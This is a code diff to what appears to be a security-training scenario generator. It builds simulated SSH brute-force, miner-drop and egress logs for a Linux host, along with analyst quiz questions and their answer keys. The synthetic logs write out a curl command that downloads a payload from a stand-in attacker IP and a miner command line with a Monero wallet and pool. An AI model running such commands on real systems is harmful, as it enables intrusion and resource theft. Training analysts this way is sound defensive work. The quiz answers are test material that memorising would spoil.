@@ -32,7 +32,10 @@ export function buildLinuxSshCryptominerScenario(
   const host = {
     name: "nix-bkp-01",
     fqdn: "nix-bkp-01.northwind-logistics.io",
-    publicIp: "84.200.17.42",
+    // One address. The perimeter firewall DNATs the published SSH port to this
+    // host, so every host-side log (sshd, auditd, Falcon) sees its own private
+    // address — the public VIP only exists on the firewall. (It previously carried
+    // a separate public IP as dst_ip on the sshd rows, so one host showed two IPs.)
     privateIp: "10.40.2.15",
     sshPort: 2202,
     os: "Ubuntu 22.04.4 LTS",
@@ -40,15 +43,15 @@ export function buildLinuxSshCryptominerScenario(
   };
 
   const attacker = {
-    spray1: "45.148.10.87",
-    spray2: "89.248.165.32",
-    spray3: "194.26.229.11",
+    spray1: "203.0.113.87",
+    spray2: "203.0.113.32",
+    spray3: "203.0.113.11",
     // The IP that actually logs in. It appears in NONE of the failure records.
-    success: "193.32.162.140",
-    payloadHost: "45.61.136.14",
+    success: "198.51.100.140",
+    payloadHost: "198.51.100.14",
   };
 
-  const pool = { domain: "pool.supportxmr.com", ip: "51.222.12.201", port: 3333 };
+  const pool = { domain: "pool.xmr-hashpool.example", ip: "192.0.2.201", port: 3333 };
   const wallet =
     "48Bkq7sMQrN3vTgHy2WdcPfXe9RuJ5a6ZnLbCmK4tiyE1DwGoApSxV7hFqjUr2NkeM9zTbYcQ5vRdgHnW3sJPuA6XLfkM8e";
   const minerHash = makeSha256("xmrig_6_21_3_linux_static_kworker");
@@ -72,8 +75,8 @@ export function buildLinuxSshCryptominerScenario(
       hostname: host.name,
       user_email: "d.okonkwo@northwind-logistics.io",
       user_title: "Linux Systems Administrator",
-      src_ip: "82.166.44.9",
-      dst_ip: host.publicIp,
+      src_ip: "192.0.2.9",
+      dst_ip: host.privateIp,
       dst_port: host.sshPort,
       protocol: "tcp",
       severity: "informational",
@@ -81,25 +84,30 @@ export function buildLinuxSshCryptominerScenario(
       mitre_technique: "T1078",
       mitre_tactic: "Initial Access",
       description:
-        "Administrator d.okonkwo authenticated to nix-bkp-01 on tcp/2202 with an ED25519 public key from the corporate VPN egress 82.166.44.9. No failed attempts precede it.",
+        "Administrator d.okonkwo authenticated to nix-bkp-01 on tcp/2202 with an ED25519 public key from the corporate VPN egress 192.0.2.9. No failed attempts precede it.",
       fp_explanation:
-        "This is a legitimate admin session and the control group for the whole scenario. Three things separate it from the compromise at 22:38: the method is publickey (not password, so it cannot be brute-forced), the source is the known corporate VPN egress rather than a hosting-provider IP, and there is not a single Failed password line from 82.166.44.9 beforehand. Students who alert on 'SSH login to an internet-exposed host' alone will flag this and be wrong.",
+        "This is a legitimate admin session and the control group for the whole scenario. Three things separate it from the compromise at 22:38: the method is publickey (not password, so it cannot be brute-forced), the source is the known corporate VPN egress rather than a hosting-provider IP, and there is not a single Failed password line from 192.0.2.9 beforehand. Students who alert on 'SSH login to an internet-exposed host' alone will flag this and be wrong.",
       authentication: { method: "publickey", result: "success" },
       raw: {
         "data.program_name": "sshd",
-        "data.srcip": "82.166.44.9",
+        "data.srcip": "192.0.2.9",
         "data.srcport": "58114",
         "data.dstport": "2202",
         "data.dstuser": "d.okonkwo",
-        "data.audit.type": "USER_AUTH",
+        "system.auth.ssh.method": "publickey",
+        // USER_LOGIN is written when the session OPENS, after pam_loginuid has set
+        // the login uid — so auid/ses are populated here. The earlier USER_AUTH /
+        // USER_ACCT records of the same handshake carry auid=4294967295 ses=4294967295
+        // (unset), because no login session exists yet during authentication.
+        "data.audit.type": "USER_LOGIN",
         "data.audit.acct": "d.okonkwo",
         "data.audit.uid": "0",
         "data.audit.auid": "1002",
         "data.audit.ses": "39",
         "data.audit.exe": "/usr/sbin/sshd",
-        "data.audit.terminal": "ssh",
-        "data.audit.op": "PAM:authentication",
-        "data.audit.grantors": "pam_unix",
+        "data.audit.addr": "192.0.2.9",
+        "data.audit.terminal": "/dev/pts/1",
+        "data.audit.op": "login",
         "data.audit.res": "success",
       },
     },
@@ -113,14 +121,14 @@ export function buildLinuxSshCryptominerScenario(
       event_type: "ssh_failed",
       hostname: host.name,
       src_ip: attacker.spray2,
-      dst_ip: host.publicIp,
+      dst_ip: host.privateIp,
       dst_port: host.sshPort,
       protocol: "tcp",
       severity: "medium",
       mitre_technique: "T1110.001",
       mitre_tactic: "Credential Access",
       description:
-        "sshd on nix-bkp-01 (nix-bkp-01.northwind-logistics.io) logged 'Invalid user' failures for generic usernames on tcp/2202. This representative record is jenkins from 89.248.165.32; the same pattern arrived from three hosting-provider IPs — 89.248.165.32, 45.148.10.87 and 194.26.229.11.",
+        "sshd on nix-bkp-01 (nix-bkp-01.northwind-logistics.io) logged 'Invalid user' failures for generic usernames on tcp/2202. This representative record is jenkins from 203.0.113.32; the same pattern arrived from three hosting-provider IPs — 203.0.113.32, 203.0.113.87 and 203.0.113.11.",
       authentication: { method: "password", result: "failure" },
       raw: {
         "data.program_name": "sshd",
@@ -150,14 +158,14 @@ export function buildLinuxSshCryptominerScenario(
       event_type: "ssh_failed",
       hostname: host.name,
       src_ip: attacker.spray1,
-      dst_ip: host.publicIp,
+      dst_ip: host.privateIp,
       dst_port: host.sshPort,
       protocol: "tcp",
       severity: "high",
       mitre_technique: "T1110.001",
       mitre_tactic: "Credential Access",
       description:
-        "sshd failures on nix-bkp-01 switched from 'Invalid user' to 'Failed password for svc-backup', arriving from 45.148.10.87 on tcp/2202.",
+        "sshd failures on nix-bkp-01 switched from 'Invalid user' to 'Failed password for svc-backup', arriving from 203.0.113.87 on tcp/2202.",
       authentication: { method: "password", result: "failure" },
       raw: {
         "data.program_name": "sshd",
@@ -187,14 +195,14 @@ export function buildLinuxSshCryptominerScenario(
       event_type: "ssh_login",
       hostname: host.name,
       src_ip: attacker.success,
-      dst_ip: host.publicIp,
+      dst_ip: host.privateIp,
       dst_port: host.sshPort,
       protocol: "tcp",
       severity: "critical",
       mitre_technique: "T1078",
       mitre_tactic: "Initial Access",
       description:
-        "'Accepted password for svc-backup' from 193.32.162.140 on tcp/2202 — session 41, auid 1004, the only successful password authentication on this host today.",
+        "'Accepted password for svc-backup' from 198.51.100.140 on tcp/2202 — session 41, auid 1004, the only successful password authentication on this host today.",
       authentication: { method: "password", result: "success" },
       raw: {
         "data.program_name": "sshd",
@@ -202,16 +210,18 @@ export function buildLinuxSshCryptominerScenario(
         "data.srcport": "41772",
         "data.dstport": "2202",
         "data.dstuser": "svc-backup",
-        "data.audit.type": "USER_AUTH",
+        "system.auth.ssh.method": "password",
+        // Session-open record (see lsc_01): auid/ses are assigned by pam_loginuid
+        // at login, so they appear here and not on the pre-auth USER_AUTH lines.
+        "data.audit.type": "USER_LOGIN",
         "data.audit.acct": "svc-backup",
         "data.audit.uid": "0",
         "data.audit.auid": "1004",
         "data.audit.ses": "41",
         "data.audit.exe": "/usr/sbin/sshd",
-        "data.audit.terminal": "ssh",
+        "data.audit.terminal": "/dev/pts/0",
         "data.audit.addr": attacker.success,
-        "data.audit.op": "PAM:authentication",
-        "data.audit.grantors": "pam_unix",
+        "data.audit.op": "login",
         "data.audit.res": "success",
       },
     },
@@ -317,14 +327,14 @@ export function buildLinuxSshCryptominerScenario(
       mitre_technique: "T1105",
       mitre_tactic: "Command and Control",
       description:
-        "curl fetched a 6.4 MB ELF binary over plain HTTP from 45.61.136.14 and wrote it to /home/svc-backup/.cache/.fontconfig/kworker as uid 1004.",
+        "curl fetched a 6.4 MB ELF binary over plain HTTP from 198.51.100.14 and wrote it to /home/svc-backup/.cache/.fontconfig/kworker as uid 1004.",
       process: {
         name: "curl",
         pid: 1934,
         path: "/usr/bin/curl",
         parent_name: "bash",
         parent_pid: 1877,
-        cmdline: `curl -fsSL http://45.61.136.14/updates/kworker -o ${minerPath}`,
+        cmdline: `curl -fsSL http://198.51.100.14/updates/kworker -o ${minerPath}`,
         user: "svc-backup",
         hash: { sha256: makeSha256("usr_bin_curl_ubuntu2204") },
       },
@@ -335,7 +345,7 @@ export function buildLinuxSshCryptominerScenario(
         size: 6_710_886,
       },
       network: {
-        url: "http://45.61.136.14/updates/kworker",
+        url: "http://198.51.100.14/updates/kworker",
         method: "GET",
         status: 200,
         bytes_in: 6_710_886,
@@ -345,17 +355,16 @@ export function buildLinuxSshCryptominerScenario(
         "crowdstrike.event_simpleName": "ProcessRollup2",
         "crowdstrike.FileName": "curl",
         "crowdstrike.FilePath": "/usr/bin/",
-        "crowdstrike.CommandLine": `curl -fsSL http://45.61.136.14/updates/kworker -o ${minerPath}`,
-        "crowdstrike.ParentProcessName": "bash",
+        "crowdstrike.ImageFileName": "/usr/bin/curl",
+        "crowdstrike.CommandLine": `curl -fsSL http://198.51.100.14/updates/kworker -o ${minerPath}`,
+        "crowdstrike.RawProcessId": "1934",
+        "crowdstrike.ParentBaseFileName": "bash",
         "crowdstrike.UserName": "svc-backup",
         "crowdstrike.UID": "1004",
         "crowdstrike.GID": "1004",
         "crowdstrike.SHA256HashData": makeSha256("usr_bin_curl_ubuntu2204"),
-        "host.os.type": "linux",
-        "host.os.name": "Ubuntu",
-        "host.os.version": "22.04.4 LTS",
+        "crowdstrike.event_platform": "Lin",
         "crowdstrike.ComputerName": host.name,
-        "event.outcome": "success",
       },
     },
 
@@ -491,17 +500,16 @@ export function buildLinuxSshCryptominerScenario(
         "crowdstrike.event_simpleName": "ProcessRollup2",
         "crowdstrike.FileName": "kworker",
         "crowdstrike.FilePath": `${minerDir}/`,
+        "crowdstrike.ImageFileName": minerPath,
         "crowdstrike.CommandLine": `${minerPath} -o ${pool.domain}:${pool.port} -u ${wallet} -p ${host.name} -k --coin monero --max-cpu-usage 90 --background`,
-        "crowdstrike.ParentProcessName": "bash",
-        "crowdstrike.ParentProcessId_decimal": "1877",
+        "crowdstrike.RawProcessId": "1974",
+        "crowdstrike.ParentBaseFileName": "bash",
         "crowdstrike.UserName": "svc-backup",
         "crowdstrike.UID": "1004",
         "crowdstrike.GID": "1004",
         "crowdstrike.SHA256HashData": minerHash,
-        "host.os.type": "linux",
-        "host.os.name": "Ubuntu",
+        "crowdstrike.event_platform": "Lin",
         "crowdstrike.ComputerName": host.name,
-        "event.outcome": "success",
       },
     },
 
@@ -521,7 +529,7 @@ export function buildLinuxSshCryptominerScenario(
       mitre_technique: "T1496",
       mitre_tactic: "Impact",
       description:
-        "Outbound TCP from nix-bkp-01 to 51.222.12.201:3333 (pool.supportxmr.com, Canada) accepted by egress policy 42 — 96,420 bytes sent, 1,842,360 received.",
+        "Outbound TCP from nix-bkp-01 to 192.0.2.201:3333 (pool.xmr-hashpool.example, Canada) accepted by egress policy 42 — 96,420 bytes sent, 1,842,360 received.",
       network: { domain: pool.domain, bytes_in: 1_842_360, bytes_out: 96_420 },
       raw: {
         "data.type": "traffic",
@@ -584,10 +592,11 @@ export function buildLinuxSshCryptominerScenario(
         "crowdstrike.event_simpleName": "ProcessRollup2",
         "crowdstrike.FileName": "restic",
         "crowdstrike.FilePath": "/usr/bin/",
+        "crowdstrike.ImageFileName": "/usr/bin/restic",
         "crowdstrike.CommandLine":
           "/usr/bin/restic backup --repo sftp:repo@10.40.2.60:/srv/restic /srv/data --exclude-caches",
-        "crowdstrike.ParentProcessName": "cron",
-        "crowdstrike.ParentProcessId_decimal": "1102",
+        "crowdstrike.RawProcessId": "2103",
+        "crowdstrike.ParentBaseFileName": "cron",
         "crowdstrike.UserName": "backup",
         "crowdstrike.UID": "34",
         "crowdstrike.GID": "34",
@@ -597,9 +606,8 @@ export function buildLinuxSshCryptominerScenario(
         // Falcon actually records — parent is cron (already named above), and
         // the command_line runs from a system path — so the student infers
         // "administrator-provisioned" rather than reading it off a flag.
-        "host.os.type": "linux",
+        "crowdstrike.event_platform": "Lin",
         "crowdstrike.ComputerName": host.name,
-        "event.outcome": "success",
       },
     },
 
@@ -642,7 +650,7 @@ export function buildLinuxSshCryptominerScenario(
     { type: "ip", value: attacker.payloadHost, first_seen: T(64 * MIN), reputation: "malicious", tags: ["payload-host", "http", "external"] },
     { type: "ip", value: pool.ip, first_seen: T(72 * MIN), reputation: "malicious", tags: ["outbound", "long-lived-session", "tcp-3333"] },
     { type: "domain", value: pool.domain, first_seen: T(72 * MIN), reputation: "malicious", tags: ["mining-pool", "external"] },
-    { type: "url", value: "http://45.61.136.14/updates/kworker", first_seen: T(64 * MIN), reputation: "malicious", tags: ["payload-url", "cleartext-http"] },
+    { type: "url", value: "http://198.51.100.14/updates/kworker", first_seen: T(64 * MIN), reputation: "malicious", tags: ["payload-url", "cleartext-http"] },
     { type: "sha256", value: minerHash, first_seen: T(64 * MIN), reputation: "malicious", tags: ["elf", "dropped-file", "masqueraded-name"] },
     { type: "user", value: "svc-backup", first_seen: T(58 * MIN), reputation: "suspicious", tags: ["compromised-account", "uid-1004", "password-auth"] },
     { type: "host", value: host.fqdn, first_seen: T(31 * MIN), reputation: "suspicious", tags: ["internet-exposed-ssh", "tcp-2202"] },
@@ -652,14 +660,14 @@ export function buildLinuxSshCryptominerScenario(
     { ts: T(0), phase: "Baseline", action: "Legitimate admin publickey session from the corporate VPN egress — the control case for the auth log" },
     { ts: T(31 * MIN), phase: "Credential Access", action: "Distributed password guessing on tcp/2202 from three hosting-provider IPs, generic usernames (T1110.001)" },
     { ts: T(52 * MIN), phase: "Credential Access", action: "Guessing narrows to svc-backup — 'Invalid user' becomes 'Failed password for svc-backup' (T1110.001)" },
-    { ts: T(58 * MIN), phase: "Initial Access", action: "Accepted password for svc-backup from 193.32.162.140 — an IP with no prior failures (T1078)" },
+    { ts: T(58 * MIN), phase: "Initial Access", action: "Accepted password for svc-backup from 198.51.100.140 — an IP with no prior failures (T1078)" },
     { ts: T(60 * MIN), phase: "Discovery", action: "id, uname -a, /etc/os-release, crontab -l run in session 41 as uid 1004 (T1033)" },
     { ts: T(61 * MIN), phase: "Discovery", action: "sudo -l returns res=failed — svc-backup is not in sudoers, no root path available (T1033)" },
     { ts: T(64 * MIN), phase: "Command and Control", action: "curl pulls a 6.4 MB ELF over HTTP into a hidden dir inside the account's own home (T1105)" },
     { ts: T(66 * MIN), phase: "Defense Evasion", action: "chmod 755 on a file owned by uid 1004; named 'kworker' to imitate a kernel thread (T1036.005)" },
     { ts: T(68 * MIN), phase: "Persistence", action: "User crontab installed via setgid-crontab binary — /var/spool/cron/crontabs/svc-backup, mode 0600 (T1053.003)" },
     { ts: T(70 * MIN), phase: "Impact", action: "Miner launched as uid 1004 with Monero wallet and pool on the command line (T1496)" },
-    { ts: T(72 * MIN), phase: "Impact", action: "Long-lived outbound session to pool.supportxmr.com:3333 permitted by catch-all egress policy 42 (T1496)" },
+    { ts: T(72 * MIN), phase: "Impact", action: "Long-lived outbound session to pool.xmr-hashpool.example:3333 permitted by catch-all egress policy 42 (T1496)" },
     { ts: T(85 * MIN), phase: "Baseline", action: "Nightly restic job starts from a root-owned /etc/cron.d entry as uid 34 — the benign CPU consumer" },
     { ts: T(95 * MIN), phase: "Detection", action: "Sustained load average alert on the 8-vCPU host; top shows kworker 690% alongside restic 96%" },
   ];
@@ -680,7 +688,7 @@ export function buildLinuxSshCryptominerScenario(
       ],
       answer: "method",
       explanation:
-        "Both Accepted lines look identical at a glance, but d.okonkwo's says 'Accepted publickey' and svc-backup's says 'Accepted password'. A public key cannot be brute-forced, which is why no Failed password lines precede the admin session while 21 minutes of them precede the other. Note also what the Accepted line does NOT match: 193.32.162.140 appears in no failure record at all, so do not expect the winning address to be the one you were counting failures from — in a distributed campaign the guessing nodes and the hands-on node are different machines. Hour is not evidence — 21:40 is also outside business hours, so it separates nothing. Port is wrong: both sessions arrive on tcp/2202, the host's only listener. The shell is identical for both and is not recorded on the Accepted line at all.",
+        "Both Accepted lines look identical at a glance, but d.okonkwo's says 'Accepted publickey' and svc-backup's says 'Accepted password'. A public key cannot be brute-forced, which is why no Failed password lines precede the admin session while 21 minutes of them precede the other. Note also what the Accepted line does NOT match: 198.51.100.140 appears in no failure record at all, so do not expect the winning address to be the one you were counting failures from — in a distributed campaign the guessing nodes and the hands-on node are different machines. Hour is not evidence — 21:40 is also outside business hours, so it separates nothing. Port is wrong: both sessions arrive on tcp/2202, the host's only listener. The shell is identical for both and is not recorded on the Accepted line at all.",
     },
     {
       id: "lsc_q2",
@@ -724,14 +732,14 @@ export function buildLinuxSshCryptominerScenario(
         "You must attribute the mining process in lsc_10 to a specific identity for the incident report. Which pair of events, read together, ties the miner to a named account and a named external actor?",
       hint: "One event names the identity, another names the process running under it. Neither is enough alone.",
       options: [
-        { value: "auth_proc", label: "lsc_04 and lsc_10 — the Accepted password for svc-backup from 193.32.162.140, and the miner running as that same uid 1004" },
+        { value: "auth_proc", label: "lsc_04 and lsc_10 — the Accepted password for svc-backup from 198.51.100.140, and the miner running as that same uid 1004" },
         { value: "fw_pool", label: "lsc_11 and lsc_13 — the outbound session to the pool, and the load alert showing the process burning 690% CPU" },
         { value: "dl_chmod", label: "lsc_07 and lsc_08 — the curl download of the ELF payload, and the chmod that made that same file executable" },
         { value: "cron_bkp", label: "lsc_09 and lsc_12 — the crontab written for svc-backup, and the nightly restic job started from cron on the host" },
       ],
       answer: "auth_proc",
       explanation:
-        "Attribution needs an identity plus an action under it. lsc_04 supplies the identity and its origin: svc-backup authenticated by password from 193.32.162.140, auid=1004, session 41. lsc_10 supplies the action: the miner running as UID 1004 with bash as its parent, in that same session lineage. Together they name both the account and the external address. The firewall-and-alert pair proves impact but names no user. The download-and-chmod pair proves file staging but names no external session. The crontab-and-restic pair mixes the malicious job with an unrelated legitimate one and proves nothing about who logged in.",
+        "Attribution needs an identity plus an action under it. lsc_04 supplies the identity and its origin: svc-backup authenticated by password from 198.51.100.140, auid=1004, session 41. lsc_10 supplies the action: the miner running as UID 1004 with bash as its parent, in that same session lineage. Together they name both the account and the external address. The firewall-and-alert pair proves impact but names no user. The download-and-chmod pair proves file staging but names no external session. The crontab-and-restic pair mixes the malicious job with an unrelated legitimate one and proves nothing about who logged in.",
     },
     {
       id: "lsc_q5",
